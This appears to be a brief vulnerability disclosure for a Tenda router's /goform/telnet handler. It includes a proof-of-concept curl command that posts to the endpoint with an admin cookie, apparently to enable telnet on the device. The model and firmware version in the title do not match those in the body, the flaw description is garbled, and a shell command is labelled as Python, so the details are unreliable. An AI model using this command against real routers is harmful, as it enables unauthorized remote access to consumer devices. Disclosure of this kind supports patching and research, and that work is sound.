# TendaAC18v15.03.05.05telnet

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/102680

## Affected version

AC15v1.0 V15.03.05.19

## Vulnerability details

An issue was discovered in AC15v1.0 V15.03.05.19 devices. An HTTP request within the handler function of the /goform/telnet route. This could lead to Shell Metacharacters.

![image-20250117231252601](/img/image-20250117231252601.png)

## POC

```python
curl -i -X POST http://192.168.1.100/goform/telnet -d aa=aa --cookie "user=admin" --http0.9
```

![image-20250117231359310](/img/image-20250117231359310.png)

